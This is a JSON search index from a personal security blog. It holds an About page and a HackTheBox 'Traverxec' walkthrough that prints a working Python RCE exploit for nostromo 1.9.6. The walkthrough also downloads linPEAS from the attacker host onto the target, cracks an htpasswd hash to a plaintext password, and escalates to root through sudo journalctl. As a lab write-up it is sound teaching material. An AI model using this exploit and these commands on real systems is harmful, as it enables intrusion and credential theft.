[{"categories":null,"content":"whoami My name is Yadiel Reyes, I go by the alias of wixnic. Iâ€™m a passionate self-motivated learner who likes to create content on IT Security related topics. In this blog you will find the content listed below: CTFs Programming Post-Exploitation AV Evasion Reverse Engineering Exploit Development Cracking Game Hacking Education: Bachelorâ€™s Degree in Information Technology, Networks and Security (GPA 4.0) Certifications: CompTIA Linux+ CompTIA Network+ Certifcations that Iâ€™m preparing for: OSCP OSEP Public Resources These are my own resources that I have made for the public: HackNotes Donate Do you like my content? Well a donation is highly appreciated (is not obligatory) but it helps me. ","date":"2021-12-08","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Donate with cryptocurrency If you want to donate with crypto, I have these options: Monero: Ethereum: Bitcoin: Dogecoin: ","date":"2021-12-08","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Donate with cash If you want to donate with cash: PayPal: Buy Me a Coffee: ","date":"2021-12-08","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":["HackTheBox Nix"],"content":"This is my description.","date":"2021-10-22","objectID":"/htb_traverxec/","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Setup As always, we need to have a comfortable space to work with so Iâ€™ll create my working directories with the mk function that I have defined in my Z shell: â¯ which mk mk () { mkdir {scans,content,loot,exploits,scripts,report} } â¯ mk â¯ ls ï„• content ï„• exploits ï„• loot ï„• report ï„• scans ï„• scripts Recon ","date":"2021-10-22","objectID":"/htb_traverxec/:0:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"OS Identification Letâ€™s start by identifying the operating system of the target: â¯ which os os () { ttl=\"$(ping -c 1 $1 | awk -F 'ttl=' '{print $2}' | cut -d ' ' -f 1 | tr -d '\\n')\" if (( $ttl \u003c= 64 )) then echo 'OS: Unix/Linux' elif (( $ttl \u003c= 128 )) then echo 'OS: Windows' else echo 'OS: Not detected' fi } â¯ os 10.10.10.165 OS: Unix/Linux As we can see the target operating system is Linux. ","date":"2021-10-22","objectID":"/htb_traverxec/:1:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"nmap nmap reveals that the ports SSH (TCP 22) and HTTP (TCP 80) are open â¯ sudo nmap -p- -n -Pn --min-rate 5000 -oG scans/nmap-tcpall 10.10.10.165 [sudo] password for wixnic: Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 18:11 AST Nmap scan report for 10.10.10.165 Host is up (0.094s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds â¯ which xp xp () { ports=\"$(cat $1 | grep -oP '\\d{1,5}/open' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)\" echo \"[+] Open ports: $ports\" \u003e\u003e xp.tmp printf $ports | xclip -sel clip echo \"[+] Ports copied to clipboard\" \u003e\u003e xp.tmp /usr/bin/bat xp.tmp rm xp.tmp } â¯ xp scans/nmap-tcpall â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: xp.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ [+] Open ports: 22,80 2 â”‚ [+] Ports copied to clipboard â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â¯ sudo nmap -p22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.165 Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 18:12 AST Nmap scan report for 10.10.10.165 Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68ğŸ’¿41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-title: TRAVERXEC |_http-server-header: nostromo 1.9.6 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.14 seconds The OpenSSH version reveals that the target distribution is most likely to be Debian and the web service is nostromo 1.9.6. ","date":"2021-10-22","objectID":"/htb_traverxec/:2:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Website - HTTP TCP 80 We can see the nostromo 1.9.6 web service from the Server HTTP header: â¯ curl -I 10.10.10.165 HTTP/1.1 200 OK Date: Sun, 17 Oct 2021 22:19:35 GMT Server: nostromo 1.9.6 Connection: close Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT Content-Length: 15674 Content-Type: text/html Note: -I = Fetch the headers only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document ","date":"2021-10-22","objectID":"/htb_traverxec/:3:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Shell as www-data ","date":"2021-10-22","objectID":"/htb_traverxec/:4:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Vulnerability Research Iâ€™ll use searchsploit to find exploits while using the name of the HTTP service which is nostromo, searchsploit shows three potential Nostromo vulnerabilities: â¯ searchsploit nostromo ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Nostromo - Directory Traversal Remote Command Execution (Metasploit) | multiple/remote/47573.rb nostromo 1.9.6 - Remote Code Execution | multiple/remote/47837.py nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution | linux/remote/35466.sh ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results â¯ searchsploit -m multiple/remote/47837.py Exploit: nostromo 1.9.6 - Remote Code Execution URL: https://www.exploit-db.com/exploits/47837 Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py File Type: Python script, ASCII text executable Copied to: /home/wixnic/htb/traverxec/47837.py Thereâ€™s a metasploit one, then a python script, and a shell script. The shell script is an exploit for an older version so weâ€™ll ignore that one. Letâ€™s start with the python exploit first. Python Code: # Exploit Title: nostromo 1.9.6 - Remote Code Execution # Date: 2019-12-31 # Exploit Author: Kr0ff # Vendor Homepage: # Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz # Version: 1.9.6 # Tested on: Debian # CVE : CVE-2019-16278 # This line needs to commented or removed #cve2019_16278.py #!/usr/bin/env python import sys import socket art = \"\"\" _____-2019-16278 _____ _______ ______ _____\\ \\ _____\\ \\_\\ | | | / / | | / /| || / / /|/ / /___/| / / /____/||\\ \\ \\ |/| |__ |___|/ | | |____|/ \\ \\ \\ | | | \\ | | _____ \\| \\| | | __/ __ |\\ \\|\\ \\ |\\ /| |\\ \\ / \\ | \\_____\\| | | \\_______/ | | \\____\\/ | | | /____/| \\ | | / | | |____/| \\|_____| || \\|_____|/ \\|____| | | |____|/ |___|/ \"\"\" help_menu = '\\r\\nUsage: cve2019-16278.py \u003cTarget_IP\u003e \u003cTarget_Port\u003e \u003cCommand\u003e' def connect(soc): # Defines an empty response response = \"\" try: while True: # Define 1024 bytes as the amount of bytes received by the socket. # Note: For best match with hardware and network realities, the value of bufsize should be a relatively small power of 2, for example, 4096. In this case is 2^10=1024, connection = soc.recv(1024) # If there's no connection then break (finish) if len(connection) == 0: break # If there is a connection, add it to the response variable response += connection # If it fails to receive a connection then pass (continue) except: pass # Return the response return response def cve(target, port, cmd): # Defines a socket soc = socket.socket() # Connects to the target IP and PORT soc.connect((target, int(port))) # Defines the payload payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\\r\\nContent-Length: 1\\r\\n\\r\\necho\\necho\\n{}2\u003e\u00261'.format(cmd) # Sends the payload to the target IP and PORT soc.send(payload) # Receive a connection receive = connect(soc) # Print the receive value print(receive) if __name__ == \"__main__\": # Print the banner art print(art) try: target = sys.argv[1] port = sys.argv[2] cmd = sys.argv[3] # Try to execute this 3 arguments (Example:10.10.10.165 80 id) cve(target, port, cmd) # If an index error happens, like not specifying the IP then it prints the help menu except IndexError: print(help_menu) Comment the line 10: â¯ sed '10q;d' 47837.py #cve2019_16278.py NUMq will quit immediately when the line number is NUM. d will delete the line instead of printing it; this is inhibited on the last line because the q causes the rest of the script to be skipped when quitting. We can su","date":"2021-10-22","objectID":"/htb_traverxec/:4:1","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Fully Interactive Shell We can enable a full TTY/PTY shell with the following commands In a reverse shell initiate a bash shell (choose one of the following, the idea is to spawn a bash shell): script /dev/null -c bash python -c 'import pty; pty.spawn(\"/bin/bash\")' echo os.system('/bin/bash') /bin/bash -i perl â€”e 'exec \"/bin/bash\";' Hit Ctrl+Z to get out of the shell and leave it running in the background, then in your console set TTY. stty raw -echo; fg Reset the reverse shell with: reset Define the terminal type, xterm works 99% of the time: \u003e Terminal Type? xterm Enable clear screen and movement with xtermand enable bash: export TERM=xterm export SHELL=bash In another console from your host get the rows and columns of the terminal: stty -a In the reverse shell set the rows and columns this will fix the margins of your terminal: stty rows \u003cnum\u003e columns \u003ccols\u003e Now confirm that youâ€™re in TTY shell with: tty Privilege Escalaton: www-data â€“\u003e david ","date":"2021-10-22","objectID":"/htb_traverxec/:5:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"linPEAS Download linPEAS from github: â¯ wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh Setup an HTTP listener: â¯ sudo python3 -m http.server 80 After some looking around, I decided to upload and run linPEAS: www-data@traverxec:/dev/shm$ wget 10.10.16.6/linpeas.sh --2021-10-17 18:33:29-- http://10.10.16.6/linpeas.sh Connecting to 10.10.16.6:80... connected. HTTP request sent, awaiting response... 200 OK Length: 477235 (466K) [text/x-sh] Saving to: 'linpeas.sh' 0K .......... .......... .......... .......... .......... 10% 160K 3s 50K .......... .......... .......... .......... .......... 21% 518K 2s 100K .......... .......... .......... .......... .......... 32% 298K 1s 150K .......... .......... .......... .......... .......... 42% 422K 1s 200K .......... .......... .......... .......... .......... 53% 346K 1s 250K .......... .......... .......... .......... .......... 64% 422K 1s 300K .......... .......... .......... .......... .......... 75% 328K 0s 350K .......... .......... .......... .......... .......... 85% 318K 0s 400K .......... .......... .......... .......... .......... 96% 330K 0s 450K .......... ...... 100% 7.59M=1.4s 2021-10-17 18:33:30 (328 KB/s) - 'linpeas.sh' saved [477235/477235] www-data@traverxec:/dev/shm$ chmod +x linpeas.sh www-data@traverxec:/dev/shm$ ./linpeas.sh ","date":"2021-10-22","objectID":"/htb_traverxec/:6:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":".htpasswd One of the things that it found out was a .htpasswd file: â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Htpasswd Files (limit 70) -rw-r--r-- 1 root bin 41 Oct 25 2019 /var/nostromo/conf/.htpasswd david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ ","date":"2021-10-22","objectID":"/htb_traverxec/:7:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Crack .htpasswd We need to find the the module that we will need to use for hashcat for recognize the hash, based on the output we can see that the hash type is md5crypt and its mode number is 500: â¯ cat hash.txt â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: hash.txt â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â¯ hashcat --example-hashes | grep '\\$1\\$' -B 2 MODE: 500 TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/ -- MODE: 12200 TYPE: eCryptfs HASH: $ecryptfs$0$1$4207883745556753$567daa975114206c -- MODE: 16700 TYPE: FileVault 2 HASH: $fvde$1$16$84286044060108438487434858307513$20000$f1620ab93192112f0a23eea89b5d4df065661f974b704191 -- MODE: 22100 TYPE: BitLocker HASH: $bitlocker$1$16$6f972989ddc209f1eccf07313a7266a2$1048576$12$3a33a8eaff5e6f81d907b591$60$316b0f6d4cb445fb056f0e3e0633c413526ff4481bbf588917b70a4e8f8075f5ceb45958a800b42cb7ff9b7f5e1 7c6145bf8561ea86f52d3592059fb Now that we know the module, we can attempt to crack the hash: â¯ find / -name 'hashcat.potfile' 2\u003e/dev/null /home/wixnic/.hashcat/hashcat.potfile â¯ echo '' \u003e ~/.hashcat/hashcat.potfile â¯ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --username --force ...\u003cSNIP\u003e... $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me ...\u003cSNIP\u003e... You can also use john, but let me empty my pot file first: â¯ find / -name 'john.pot' 2\u003e/dev/null /home/wixnic/.john/john.pot â¯ echo '' \u003e ~/.john/john.pot Now we can use john: â¯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status Nowonly4me (david) 1g 0:00:00:22 DONE (2021-10-17 18:47) 0.04411g/s 466626p/s 466626c/s 466626C/s Noyoudo..Nous4=5 Use the \"--show\" option to display all of the cracked passwords reliably Session completed Looking at the nostromo configuration file nhttpd.conf: www-data@traverxec:$ cd /var/nostromo/conf www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf cat nhttpd.conf # MAIN [MANDATORY] servername traverxec.htb serverlisten * serveradmin david@traverxec.htb serverroot /var/nostromo servermimes conf/mimes docroot /var/nostromo/htdocs docindex index.html # LOGS [OPTIONAL] logpid logs/nhttpd.pid # SETUID [RECOMMENDED] user www-data # BASIC AUTHENTICATION [OPTIONAL] htaccess .htaccess htpasswd /var/nostromo/conf/.htpasswd # ALIASES [OPTIONAL] /icons /var/nostromo/icons # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www We can see that this file has some home directories and one of them is public which points to public_www and the server admin is david. If we read the man page of nostromo, we can see the HOMEDIRS section (read this): HOMEDIRS To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example: http://www.nazgul.ch/~hacki/ The content of the home directory is handled exactly the same way as a directory in your document root. If some users don't want that their home directory can be accessed via HTTP, they shall remove the world readable flag","date":"2021-10-22","objectID":"/htb_traverxec/:8:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Shell over SSH Now that we have the decrypted private key, we can use it to authenticate to the SSH service as the user david: â¯ ssh -i id_rsa_david david@10.10.10.165 The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established. ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts. Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 david@traverxec:~$ id uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) david@traverxec:~$ cut -c-5 user.txt 7db0b Privilege Escalation: david -\u003e root ","date":"2021-10-22","objectID":"/htb_traverxec/:9:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Enumeration We can start by enumerating the home folder of the current user: david@traverxec:~$ ls -lahR \u003c...snip...\u003e david@traverxec:~$ cat bin/server-stats.sh #!/bin/bash cat /home/david/bin/server-stats.head echo \"Load: `/usr/bin/uptime`\" echo \" \" echo \"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`\" echo \"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`\" echo \" \" echo \"Last 5 journal log lines:\" /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat Thereâ€™s a script which runs sudo on the program journalctl. ","date":"2021-10-22","objectID":"/htb_traverxec/:10:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Exploiting journalctl If we look up journalctrl on gtfobins (read gtfobins), and there is a sudo option. Itâ€™s quite short and simply saying: sudo journalctl !/bin/sh The journalctrl will output to stdout if it the amount of vertical lines can fit onto the current page, otherwise it will go into less if it canâ€™t. We can try this on our localhost: sudo journalctl You will see that we are now in less: sep 09 20:49:55 parrot kernel: MTRR default type: uncachable sep 09 20:49:55 parrot kernel: MTRR fixed ranges enabled: sep 09 20:49:55 parrot kernel: 00000-9FFFF write-back lines 1-39 In the journalctl command we can see the parameter -n which takes 5 lines as the argument this means that only five lines will be sent to the output, so we need to shrink the terminal to something smaller than 5 lines, and weâ€™ll get sent into less as root. Lets try this on our host first, to see how it works: sudo journalctl -n 5 Letâ€™s not forget to resize the terminal (vertically). Knowing this, we can try to attempt to escalate privileges with command shown in GTFOBins: david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service -- Logs begin at Sun 2021-10-17 18:09:21 EDT, end at Sun 2021-10-17 19:25:33 EDT. -- Oct 17 18:34:04 traverxec sudo[3841]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost= user=www-data Oct 17 18:34:06 traverxec sudo[3841]: pam_unix(sudo:auth): conversation failed Oct 17 18:34:06 traverxec sudo[3841]: pam_unix(sudo:auth): auth could not identify password for [www-data] !/bin/bash root@traverxec:/home/david# id uid=0(root) gid=0(root) groups=0(root) root@traverxec:/home/david# cd /root root@traverxec:~# ls nostromo_1.9.6-1.deb root.txt root@traverxec:~# cut -c-5 root.txt 9aa36 Alternatively, we can just setup the stty rows to have less than 5 rows (vertical lines): david@traverxec:~$ stty rows 1 david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service !/bin/bash root@traverxec:/home/david# id uid=0(root) gid=0(root) groups=0(root) root@traverxec:/home/david# ","date":"2021-10-22","objectID":"/htb_traverxec/:11:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"This is my description.","date":"2021-10-22","objectID":"/test/","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"Test","uri":"/test/"},{"categories":["HackTheBox Nix"],"content":"Setup As always, we need to have a comfortable space to work with so Iâ€™ll create my working directories with the mk function that I have defined in my Z shell: ","date":"2021-10-22","objectID":"/test/:0:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"Test","uri":"/test/"}]